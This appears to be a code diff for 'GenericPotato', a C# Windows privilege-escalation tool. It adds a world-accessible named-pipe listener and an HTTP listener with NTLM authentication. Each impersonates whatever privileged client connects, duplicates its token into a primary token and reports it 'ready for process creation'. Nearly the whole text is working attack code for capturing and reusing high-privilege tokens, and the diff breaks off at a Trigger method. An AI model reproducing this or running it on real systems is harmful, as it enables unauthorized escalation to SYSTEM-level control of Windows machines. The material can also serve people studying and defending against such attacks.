@@ -1,8 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.IO.Pipes;
 using System.Net;
 using System.Net.Sockets;
+using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
@@ -17,112 +19,142 @@ namespace GenericPotato {
     internal class PotatoAPI {
 
         Thread listener;
-        LocalNegotiator negotiator = new LocalNegotiator();
+        NamedPipeServerStream spoolPipe;
+        Mode mode;
+        public EventWaitHandle readyEvent = new EventWaitHandle(false, EventResetMode.AutoReset);
+        IntPtr systemImpersonationToken = IntPtr.Zero;
+
         readonly int port;
+
+        public enum Mode
+        {
+            HTTP,
+            SMB
+        }
 
         public IntPtr Token {
             get {
-                return negotiator.Token;
+                return systemImpersonationToken;
             }
         }
 
-        public EventWaitHandle readyEvent = new EventWaitHandle(false, EventResetMode.AutoReset);
 
-        public PotatoAPI(ushort port) {
+        public PotatoAPI(ushort port, Mode mode) {
 
             this.port = port;
-            StartThread();
+            this.mode = mode;
+
+            switch (mode)
+            {
+                case Mode.SMB:
+                    listener = new Thread(NamedPipeListener);
+                    listener.Start();
+                    break;
+                case Mode.HTTP:
+                    listener = new Thread(HTTPListener);
+                    listener.Start();
+                    break;
+            }
         }
 
-        public Thread StartThread() {
-            listener = new Thread(Listener);
-            listener.Start();
-            return listener;
+        void NamedPipeListener()
+        {
+            string hostName = System.Net.Dns.GetHostName();
+            byte[] data = new byte[4];
+
+            PipeSecurity ps = new PipeSecurity();
+            SecurityIdentifier sid = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
+            PipeAccessRule par = new PipeAccessRule(sid, PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow);
+            ps.AddAccessRule(par);
+
+            Console.WriteLine($"[+] Starting named pipe at \\\\{hostName}\\pipe\\test");
+            spoolPipe = new NamedPipeServerStream($"test", PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 2048, 2048, ps);
+            readyEvent.Set();
+
+            spoolPipe.WaitForConnection();
+            Console.WriteLine("[+] Received connection to our named pipe");
+
+            spoolPipe.Read(data, 0, 4);
+
+            spoolPipe.RunAsClient(() => {
+                if (!ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(),
+                    ImpersonationToken.TOKEN_ALL_ACCESS, false, out var tokenHandle))
+                {
+                    Console.WriteLine("[-] Failed to open thread token");
+                    return;
+                }
+
+                if (!ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,
+                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                    ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken))
+                {
+                    Console.WriteLine("[-] Failed to duplicate impersonation token");
+                    return;
+                }
+
+                Console.WriteLine("[+] Duplicated impersonation token ready for process creation");
+            });
+
+            readyEvent.Set();
+            spoolPipe.Close();
         }
 
-
-        string GetAuthorizationHeader(Socket socket) {
+        string GetAuthorizationHeader(Socket socket)
+        {
 
             byte[] buffer = new byte[8192];
-            int len = socket.Receive(buffer);
-
+            socket.Receive(buffer);
             string authRequest = Encoding.ASCII.GetString(buffer);
             Regex rx = new Regex(@"Authorization: Negotiate (?<neg>.*)");
             MatchCollection matches = rx.Matches(authRequest);
 
-            if(matches.Count == 0) {
+            if (matches.Count == 0)
+            {
                 return null;
             }
 
-            return matches[0].Groups["neg"].Value;           
+            return matches[0].Groups["neg"].Value;
         }
 
-        void Listener() {
+        void HTTPListener()
+        {
 
-            Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            listenSocket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, 1);
-
-            listenSocket.Bind(new IPEndPoint(IPAddress.Loopback, port));
-            listenSocket.Listen(10);
-
+            Console.WriteLine($"[+] Starting HTTP listener on port {port}");
+            HttpListener listener = new HttpListener();
+            listener.Prefixes.Add($"http://*:{port}/");
+            listener.Start();
+            listener.AuthenticationSchemes = AuthenticationSchemes.IntegratedWindowsAuthentication;
+            listener.UnsafeConnectionNtlmAuthentication = true;
+            listener.IgnoreWriteExceptions = true;
             readyEvent.Set();
 
-            Socket clientSocket = listenSocket.Accept();
+            HttpListenerContext context = listener.GetContext();
+            Console.WriteLine("Request for: " + context.Request.Url.LocalPath);
+            Console.WriteLine("Client: " + context.User.Identity.Name);
 
-            byte[] buffer = new byte[8192];
-            clientSocket.Receive(buffer);
+            var identity = (System.Security.Principal.WindowsIdentity)context.User.Identity;
 
-            string challengeResponse = String.Format(
-                "HTTP/1.1 401 Unauthorized\r\n" +
-                "WWW-Authenticate: Negotiate\r\n" +
-                "Content-Length: 0\r\n" +
-                "Connection: Keep-alive\r\n\r\n"
-                ); 
-
-            clientSocket.Send(Encoding.ASCII.GetBytes(challengeResponse));
-            clientSocket = listenSocket.Accept();
-            string authHeader = GetAuthorizationHeader(clientSocket);
-
-            try
+            using (System.Security.Principal.WindowsImpersonationContext wic = identity.Impersonate())
             {
-                if (!negotiator.HandleType1(Convert.FromBase64String(authHeader)))
+                if (!ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(),
+                    ImpersonationToken.TOKEN_ALL_ACCESS, false, out var tokenHandle))
                 {
-                    Console.Write("[!] Failed to handle type SPNEGO");
-                    clientSocket.Close();
-                    listenSocket.Close();
+                    Console.WriteLine("[-] Failed to open thread token");
                     return;
                 }
-            }
-            catch (FormatException)
-            {
-                Console.Write("[!] Failed to parse SPNEGO Base64 buffer");
-                return;
-            }
 
-            challengeResponse = String.Format(
-                "HTTP/1.1 401 Unauthorized\r\n" +
-                "WWW-Authenticate: Negotiate {0}\r\n" +
-                "Content-Length: 0\r\n" +
-                "Connection: Keep-alive\r\n\r\n",
-                Convert.ToBase64String(negotiator.Challenge)
-                );
+                if (!ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,
+                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                    ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken))
+                {
+                    Console.WriteLine("[-] Failed to duplicate impersonation token");
+                    return;
+                }
 
-            clientSocket.Send(Encoding.ASCII.GetBytes(challengeResponse));
-            authHeader = GetAuthorizationHeader(clientSocket);
-
-            try
-            {
-                negotiator.HandleType3(Convert.FromBase64String(authHeader));
-            }
-            catch (FormatException)
-            {
-                Console.WriteLine("[!] Failed to parse SPNEGO Auth packet");
+                Console.WriteLine("[+] Duplicated impersonation token ready for process creation");
             }
 
             readyEvent.Set();
-
-            clientSocket.Close();
-            listenSocket.Close();
         }
 
         public bool Trigger()
